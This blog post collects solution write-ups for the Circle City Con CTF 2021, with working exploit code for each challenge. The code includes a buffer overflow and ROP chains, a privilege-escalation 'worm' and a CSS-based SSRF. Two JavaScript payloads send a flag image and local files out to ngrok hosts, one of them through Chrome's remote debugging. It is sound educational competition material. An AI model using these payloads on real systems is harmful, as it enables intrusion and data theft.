+++
title = "Circle City Con CTF 2021"
date = 2021-06-13

[taxonomies]
tags = ["ctf-writeups"]
+++

I competed with ret2rev, finishing in 7th place. Writeups aren't complete; I started writing and stopped when I got bored lol. 

<!-- more -->


# fawn cdn (pwn)

```text
I'm starting a modern internet business! That means I need my own Content Delivery Network! Check it out and see what you think, I wrote it at a hackathon!
nc 35.224.135.84 1001
```

```text
❯ ./fawncdn
 ________ ________  ________  ________      
|\  _____\\   ____\|\   ___ \|\   ___  \    
\ \  \__/\ \  \___|\ \  \_|\ \ \  \\ \  \   
 \ \   __\\ \  \    \ \  \ \\ \ \  \\ \  \  
  \ \  \_| \ \  \____\ \  \_\\ \ \  \\ \  \ 
   \ \__\   \ \_______\ \_______\ \__\\ \__\
    \|__|    \|_______|\|_______|\|__| \|__|


1. List files.
2. Choose files.
3. Deliver files.
4. Quit.
```

[fawncdn](https://github.com/b01lers/circle-city-ctf-2021/raw/main/pwn/fawncdn/dist/fawncdn)

Got a menu-driven pwnable. Listing files gives a brief json error message and the address of the function "win" which writes the bytes of a file to stdout. Choose files does nothing useful, just prints out a json error message. Deliver files is the most interesting -- it executes a function pointer stored on the stack. There is a 9 byte buffer overflow when reading in the menu choice, which is sufficient to override the function pointer. We can then get the stored image like so:

1. leak win address by listing files
2. overwrite function pointer
3. invoke function pointer
4. read the image lol

![CCC{th3y_w3r3nt_ly1ng_th1s_CDN_c4n_d3l1v3r}](https://raw.githubusercontent.com/b01lers/circle-city-ctf-2021/main/pwn/fawncdn/solve/fawn.jpg)

```python
#!/usr/bin/env python3

from pwn import *
import re
exe = ELF("fawncdn")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("35.224.135.84", 1001)
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="b *main+269")
    else:
        return process([exe.path])


def main():
    r = conn()
    r.sendline("1")
    win = int(re.search(b"(0x.*?)\"",r.recvuntil("}")).group(1),16)
    log.info("win function ptr: " + hex(win))
    r.sendline(b"A" * 16 + p64(win))
    r.recvuntil("cmd> ")
    r.recvuntil("cmd> ")
    r.recvuntil("cmd> ")
    r.sendline(b"3")
    image = r.recvuntil("1. List files.")
    f = open("fawn.jpg","wb")
    f.write(image)
    f.close()
    
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

# worm (pwn)

```text
Write a worm and pwn my system :)
nc 35.188.197.160 1001
```
[worm](https://github.com/b01lers/circle-city-ctf-2021/raw/main/pwn/worm/dist/worm.zip)

So we get arbitary code exec on the system already and our goal is to find the flag, which is randomly distributed between 2^10 folders which are created in a tree structure. Making things slightly more complicated, each level is owned by a different user and you need to privesc with a trivially exploitable SUID binary. Also you get 512 bytes to do it lol. There were two versions of this challenge -- the original did not close stdin so you could execute bash and get a shell indefinitely. The fixed version resolved that issue.  Fortunately, my solution was under 512 bytes already when compressed so free points. 

```text
room0/
|-- key
|-- room0
|   |-- key
|   |-- room0
|   |   `-- flag.txt
|   `-- room1
`-- room1
    |-- key
    |-- room0
    `-- room1
```


```python
from subprocess import PIPE, Popen, run
import os
import shutil

# execute while working directory is /room0
# echo $this | base64 -d | gunzip > /tmp/worm.py; cd /room0; python3 /tmp/worm.py

if os.path.exists("flag.txt"):
	shutil.copy("flag.txt", "/tmp/flag.txt")

payload0 = b"A" * 32 + b"p4ssw0rd\n" + b"cd room0;\n" + b"python3 /tmp/worm.py;\n" + b""
p = run(["./key"], capture_output=True, input=payload0)
print(p.stdout)
print(p.stderr)

payload1 = b"A" * 32 + b"p4ssw0rd\n" + b"cd room1;\n" + b"python3 /tmp/worm.py;\n" + b""
p = run(["./key"], capture_output=True, input=payload1)
print(p.stdout)
print(p.stderr)
```

# little mountain (rev)

```text
Climb this mountain and score some points :)
```

[little](https://github.com/b01lers/circle-city-ctf-2021/raw/main/rev/little_mountain/dist/little)

```c
void main(void)

{
  int local_c;
  
  setabuf();
  do {
    puts("Option 0: Guess the number");
    puts("Option 1: Change the number");
    puts("Option 2: Exit");
    __isoc99_scanf(&DAT_0049e0d7,&local_c);
    (**(code **)(funcs + (long)local_c * 8))();
  } while( true );
}
```

My immediate thought when seeing this is that we have an unchecked function pointer array and that's sus as fuck. This isn't pwn but it still got me thinking. Let's open it up in GDB and see what funcs[3] is. 

```text
gef➤  bt
#0  0x0000000000401cf5 in d ()
#1  0x0000000000401ed7 in main ()
```

A function called d; sounds meaningful. 

```c
void d(void)

{
  byte local_29;
  int local_28;
  int local_24;
  char *local_20;
  undefined *local_18;
  int local_10;
  int local_c;
  
  local_18 = &DAT_0049e022;
  local_20 = "little_mountain";
  local_24 = thunk_FUN_004010de(&DAT_0049e022);
  local_28 = thunk_FUN_004010de(local_20);
  local_10 = 0;
  if (modded == 0x14) {
    local_c = 0;
    while (local_c < local_24) {
      if (local_10 == local_28) {
        local_10 = 0;
      }
      local_29 = local_20[local_10] ^ local_18[local_c];
      local_10 = local_10 + 1;
      write(1,&local_29,1);
      local_c = local_c + 1;
    }
    puts("\n");
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
bet thats a flag. If modded is equal to 0x14 it will print text to stdout. modded is set when changing the number. 

```c
void regen_number(void)

{
  puts("Always ready for more");
  magic = random();
  modded = modded + 1;
  return;
}
```

This means all we need to do is change the number 0x14 times and then invoke option 3 and we're probably going to get the flag. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("little")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("addr", 1337)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()
    for i in range(0x14):
        r.sendline(b"1")
    r.sendline(b"3")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
````


```text
flag{b4bys73p5upt3hm0un741n}
```

# angrbox (misc)

```text
Write me a program that:
- Takes 4 uppercase characters in argv
- Verifies the 4 character key and returns 0 if correct
- If I find the key, YOU LOSE
nc 35.194.4.79 7000
```
[angrbox](https://github.com/b01lers/circle-city-ctf-2021/raw/main/misc/angrbox/dist/angrbox.zip)

My first thought was to make a program nondeterministic within the scope of the binary; things like environmental variables, execve, etc. As it turns out, angr doesn't fail on these it just gives you a wrong answer. I know it's possible to construct a function with exponential path explosion, but there is an easier solution -- big big numbers. Who needs exponential growth when you have 8 0's lol. I know from experience that raw z3 can't reverse an LCG of this length in a reasonable time so I assumed angr wouldn't be able to do it either. 

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (int argc, char** argv) {

   srand(argv[1][0] * 1 + argv[1][1] * 2 + argv[1][2] * 3 + argv[1][3] * 4);
   for(int i = 0; i < 100000000; i++) {
      rand();
   }
   if(rand() == 195600770) {
      return 0;
   } else {
      return 1;
   }
}
```

```text
CCC{p4th_3pl0s10n_4s_a_tr4pd00r_funct10n?_0r_d1d_y0u_ch33s3_1t}
```

I think I can safely say this is cheese :)

# artform (rev)

```text
Anything can be a form of art. Even this challenge description is a form of art if I find a gallery with no standards!
```
[artform](https://github.com/b01lers/circle-city-ctf-2021/raw/main/rev/artform/dist/artform)

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 uStack48;
  undefined8 uStack40;
  undefined8 uStack32;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uStack40 = 0x625f3368745f7434;
  uStack32 = 0x7d68357572;
  local_38 = 0x316c5f317b434343;
  uStack48 = 0x33625f30745f336b;
  memset(&local_38,0x41,0x20);
  printf("You like to paint? You know what I say to that? %s!",&local_38);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

This gives me big big flag vibes. I can retrieve this with Ghidra, but it's faster to just pop it open in GDB. 

```text
CCC{1_l1k3_t0_b34t_th3_bru5h}
```

# guardian (rev)

```text
We have a really cool owl mascot, but there's no really cool owl themed movies....well actually....there's one.
nc 35.224.135.84 2000
```
[guardian](https://github.com/b01lers/circle-city-ctf-2021/raw/main/rev/guardian/dist/guardian)

```text
❯ ./guardian
!WWWWWeeu..   ..ueeWWWWW!
 "$$(    R$$e$$R    )$$"
  "$8oeeo. "*" .oeeo8$"
  .$$#"""*$i i$*"""#$$.
  9$" @*c $$ $$F @*c $N
  9$  NeP $$ $$L NeP $$
  `$$uuuuo$$ $$uuuuu$$"
  x$P**$$P*$"$P#$$$*R$L
 x$$   #$k #$F :$P` '#$i
 $$     #$  #  $$     #$k
d$"     '$L   x$F     '$$
$$      '$E   9$>      9$>
$6       $F   ?$>      9$>
$$      d$    '$&      8$
"$k    x$$     !$k    :$$
 #$b  u$$L      9$b.  $$"
 '#$od$#$$u....u$P$Nu@$"
 ..?$R)..?R$$$$*"  #$P
 $$$$$$$$$$$$$$@WWWW$NWWW
 `````""3$F""""#$F"""""""
        @$.... '$B
       d$$$$$$$$$$:
       
HOOOOOOOOOO Goes there? Do you have the password?
 >
```
The password is the flag, compared byte by byte. For each correct byte it will display a check mark. Since that means we know if each individual character is correct or not, we can bruteforce it in 95\*len instead of 256^len. 

```text
> CCC
✅  ✅  ✅  
Hoo hoo hoo!
That is incorrect, my guardian.
```

```python
#!/usr/bin/env python3

from pwn import *
from string import printable
exe = ELF("guardian")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("35.224.135.84", 2000)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    known = "CCC{let_m3_thr0ugh!_let_me_p4ss!_d0_y0u_th1nk_y0u_c4n_h3lp_h3r"
    while True:
        for i in printable:
            r = conn()
            r.recvuntil("Goes there? Do you have the password?\n")
            r.sendline(known + i)
            print("trying " + known + i)
            resp_line = r.recvuntil("H")[2:][:-1].rstrip()
            r.close()
            if resp_line.count(b"\xe2\x9c\x85") != len(known) + 1:
                continue
            known += i
            break
        print(known)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
CCC{let_m3_thr0ugh!_let_me_p4ss!_d0_y0u_th1nk_y0u_c4n_h3lp_h3r?}
```

# weird rop (pwn)

```text
I put my ROP Gadgets through the wash with my nice sweater and they all came out pink. I hope they still.
work.
nc 35.224.135.84 1000
```
[weird-rop](https://github.com/b01lers/circle-city-ctf-2021/raw/main/pwn/weird-rop/dist/weird-rop)

```text
❯ checksec weird-rop
[*] '/home/sky/circle-city-ctf/weird_rop/weird-rop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

```c
void vuln(void)

{
  int iVar1;
  char cStack16;
  undefined uStack15;
  
  iVar1 = open(flag,2,0);
  cStack16 = (char)iVar1 + '0';
  uStack15 = 10;
  write(1,&cStack16,2);
  read(0,&stack0xfffffffffffffff8,200);
  return;
}
```
so this program does 3 things:

1. open up flag.txt
2. write the return value of open + '0' to stdout
3. read 200 bytes onto the stack

The read is trivially a very big buffer overflow on the stack, allowing me to control RIP. The written character is also important -- it is the ascii value corresponding to the file descriptor of flag.txt. For whatever reason this is 5 on the server and 3 locally. 

From the name and challenge description I can expect we'll be missing the usual pop etc gadgets and will have to do something more convoluted to control arguments. A quick search with ropper shows this is partially the case. We have gadgets to control RAX, RSI, and RDX, but nothing to allow direct control of RDI. What we do have is a ton of xor RDI, constant gadgets. We'll be using these XOR gadgets to set RDI equal to the flag file descriptor. There are gadgets for XOR RDI, 0x53 and XOR RDI, 0x56 so I use those. 

At this point, we have all the pieces and just need to put them together. 

1. read flag fd into some memory (I picked writeable binary area because PIE is off and the address is static)
2. write flag from that address to stdout. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("weird-rop")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("35.224.135.84", 1000)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])

def main():
    r = conn()

    mov_rax_1_ret = 0x000000000040100a
    mov_rax_0_ret = 0x0000000000401002
    mov_rdi_1_ret = 0x0000000000401012
    pop_rdx_ret = 0x00000000004010de
    pop_rsi_ret = 0x0000000000401000
    xor_rdi_53 = 0x000000000040107c
    xor_rdi_56 = 0x000000000040101a
    syscall_ret = 0x00000000004010db
    payload = b"A" * 24
    payload += p64(mov_rax_0_ret)
    payload += p64(pop_rsi_ret) + p64(0x0000000000402010)
    payload += p64(xor_rdi_53) + p64(xor_rdi_56)
    payload += p64(pop_rdx_ret) + p64(0x30)
    payload += p64(syscall_ret)

    payload += p64(mov_rax_1_ret)
    payload += p64(mov_rdi_1_ret)
    payload += p64(pop_rsi_ret) + p64(0x0000000000402010)
    payload += p64(pop_rdx_ret) + p64(0x30)
    payload += p64(syscall_ret)
    payload += p64(0x00401154) # main
    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
CCC{math_is_hard_1234897}
```

# double (misc/forensics)

```text
I saved the flag in a Docker container, but where did Docker actually store it?
```
[dump.mem.tar.xz](https://github.com/b01lers/circle-city-ctf-2021/raw/main/forensics/double/dist/dump.mem.tar.xz)
[Ubuntu_5.4.0-64-generic_profile.zip](https://github.com/b01lers/circle-city-ctf-2021/raw/main/forensics/double/dist/Ubuntu_5.4.0-62-generic_profile.zip)

Docker stores (by default at least) files in an overlay fs. 

```text
❯ python2 ~/tools/volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_4_0-62-generic_profilex64 linux_psaux
Volatility Foundation Volatility Framework 2.6.1
Pid    Uid    Gid    Arguments                                                                                                
11560  0      0      sudo -s                                                         
11561  0      0      /bin/bash                                                       
11568  0      0      docker run -it alpine:3.7 /bin/sh                               
11604  0      0      /usr/bin/containerd-shim-runc-v2 -namespace moby -id e4af91e1e1bdb71af00437bf9503d5ef97ebf4406343d7778f1b9a52cdaeaa03 -address /run/containerd/containerd.sock
11626  0      0      /bin/sh                                                         
11670  0      0      vi secret.txt                                                   
11779  1000   1000   /usr/bin/python3 /usr/bin/update-manager --no-update --no-focus-on-map
````

Volatility can often recover files, so let's try that. 

```text
❯ python2 ~/tools/volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_4_0-62-generic_profilex64 linux_enumerate_files | grep secret
Volatility Foundation Volatility Framework 2.6.1
0xffffa0f6fadd78c8                    289058 /var/lib/docker/overlay2/0302e6c324b486a627e0243c020d8a7d5edd1eab9f186af5d0f6a83b5b82c989/diff/secret.txt
               0x0 ------------------------- /var/lib/docker/overlay2/0302e6c324b486a627e0243c020d8a7d5edd1eab9f186af5d0f6a83b5b82c989-init/diff/secret.txt
               0x0 ------------------------- /var/lib/docker/overlay2/c6010ae8b5857ab4d731cead4147b7d55b6ed8f985d5cbd975cfa529d2d75e30/diff/secret.txt
0xffffa0f6fa676360                    142019 /usr/lib/x86_64-linux-gnu/libsecret-1.so.0.0.0
0xffffa0f6fa99bb40                    289058 /var/lib/docker/overlay2/0302e6c324b486a627e0243c020d8a7d5edd1eab9f186af5d0f6a83b5b82c989/merged/secret.txt

❯ python2 ~/tools/volatility/vol.py -f dump.mem --profile=LinuxUbuntu_5_4_0-62-generic_profilex64 linux_find_file -i 0xffffa0f6fadd78c8 -O secret.txt
Volatility Foundation Volatility Framework 2.6.1

❯ cat secret.txt
C C C { d 0 c k 3 r _ i n _ a _ V M }
```

# casino (web)

```text
Can you make $1000 off Casino#4970? (say !help to view commands) 
```
[casino](https://github.com/b01lers/circle-city-ctf-2021/blob/main/web/casino/dist/casino.zip)

```js
app.get('/set_balance', internal, async (req, res) => {
  const user = req.query.user
  if (user === undefined || user.length > 64) {
    return res.status(400).json({ error: 'Invalid user string' })
  }

  const balance = parseInt(req.query.balance)
  if (isNaN(balance)) {
    return res.status(400).json({ error: 'Invalid balance' })
  }

  await setBalance(user, balance)
  return res.status(200).end()
})
```
We can set our balance with a GET request. A middleware (internal) means we can't call it directly because we aren't on the docker network, but this sure sounds like GET ssrf. The vulnerability is in the $badge command -- it will style your profile pic and balance, and allow you to provide CSS for it. CSS can make GET requests in a number of ways -- a payload like this will work. 

```css
body {
    background-image: url("http://172.16.0.10:3000/set_balance?user=sky%230004&balance=10000");
}
```

After that you can just get the flag by way of $flag. 

```text
CCC{maybe_1_sh0uldv3d_us3d_P0ST_in5t3ad_of_G3T}
```

# imgfiltrate (web)

```text
Can you yoink an image from the admin page?
```
[imgfiltrate](https://github.com/b01lers/circle-city-ctf-2021/raw/main/web/imgfiltrate/dist/imgfiltrate.zip)

We get an "admin bot" which will visit an arbitrary webpage and a webpage which will provide the flag as an image. This page is vulnerable to css by way of GET parameter. The idea is to write that image to a canvas and then exfiltrate the data from the canvas. There is CSP, but the script nonce is static and in the website so it's trivial to bypass. 

```js
<script nonce="70861e83ad7f1863b3020799df93e450">
window.onload = (event) => {
    var img = new Image(),
    canvas = document.createElement("canvas"),
    ctx = canvas.getContext("2d"),
    src = "/flag.php";
    img.onload = function() {
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
      scrpt = document.createElement("script");
      scrpt.src = 'http://50e4b12740bd.ngrok.io?c=' + canvas.toDataURL();
      scrpt.nonce = "70861e83ad7f1863b3020799df93e450"
      document.body.appendChild(scrpt)
    }
  img.src = src;
  document.body.appendChild(canvas);

}
</script>
```

```text
CCC{c4nvas_b64}
```

# puppet (web)

```text
The flag has a random name in ~/Documents/. Pwn my browser:
```
[puppet](https://github.com/b01lers/circle-city-ctf-2021/raw/main/web/puppet/dist/puppet.zip)

```js
const browser = await puppeteer.launch({
  dumpio: true,
  args: [
    '--disable-web-security',
    '--user-data-dir=/tmp/chrome',
    '--remote-debugging-port=5000',
    '--disable-dev-shm-usage', // Docker stuff
    '--js-flags=--jitless' // No Chrome n-days please
  ]
})
```
No same origin policy (--disable-web-security) and remote debugging is quite the combo. By remotely controlling the browser we can use the file:// protocol, making it possible to enumerate files and then leak them. Pardon my gross exploit, I was running on very little sleep and I don't have it in me to clean it up now. I just hosted it as an HTML page and pointed the admin bot towards it. 

```js
const blobToBase64 = blob => {
  const reader = new FileReader();
  reader.readAsDataURL(blob);
  return new Promise(resolve => {
    reader.onloadend = () => {
      resolve(reader.result);
    };
  });
};

fetch("http://localhost:5000/json/new?file:///home/inmate/Documents")
.then((res) => res.blob())

fetch("http://localhost:5000/json/list")
.then((res) => res.json())
.then((json) => {
	found = json.find(ele => ele.url == "file:///home/inmate/Documents")
	window.ws = new WebSocket(found.webSocketDebuggerUrl)
	ws.onerror = (e=>{document.writeln('error')})
	ws.onmessage = (e=>{

	  fetch("http://6c3d5682e207.ngrok.io?onmsg=" + e.data).then((r) => console.log(r))
	  var match = e.data.match(/(flag_.*?\.txt)/g);
	  fetch("http://6c3d5682e207.ngrok.io?match=" + match[0] ).then((r) => {

	  	console.log(r)
	  })
	  if (match) {
	  	ws.send(JSON.stringify({
		  id:4,
		  method:"Page.navigate",
		  params:{
		  	url:"view-source:file:///home/inmate/Documents/" + match[0]
		  }
		}))
		// I call this one the "i forgot setInterval existed"
		for(var i = 0; i < 100000; i++) {
			console.log("hi");
		}
		ws.send(JSON.stringify({
		  id:5,
		  method:"Runtime.evaluate",
		  params:{
		  	expression:"document.documentElement.outerHTML"
		  }
		}))
		}
		
	})

	ws.onopen = ()=>{

		// I call this one the "i forgot setInterval existed"
		for(var i = 0; i < 1000; i++) {
			console.log("hi");
		}
		ws.send(JSON.stringify({
		  id:1,
		  method:"Runtime.evaluate",
		  params:{
		  	expression:"document.documentElement.outerHTML"
		  }
		}))
		ws.send(JSON.stringify({
		  id:2,
		  method:"Runtime.evaluate",
		  params:{
		  	expression:"document.documentElement.outerHTML"
		  }
		}))
		ws.send(JSON.stringify({
		  id:3,
		  method:"Runtime.evaluate",
		  params:{
		  	expression:"document.documentElement.outerHTML"
		  }
		}))

	}
	return json
})
.then((blob) => JSON.stringify(blob))
.then((blob) => btoa(blob))
.then((b64) => {
	console.log(b64);
	fetch("http://6c3d5682e207.ngrok.io?c=" + b64).then((r) => console.log(r))

})
.catch((err) => console.log(err))
```
```text
CCC{1f_0nly_th3r3_w4s_X55_0n_th3_d3vt00ls_p4g3}
```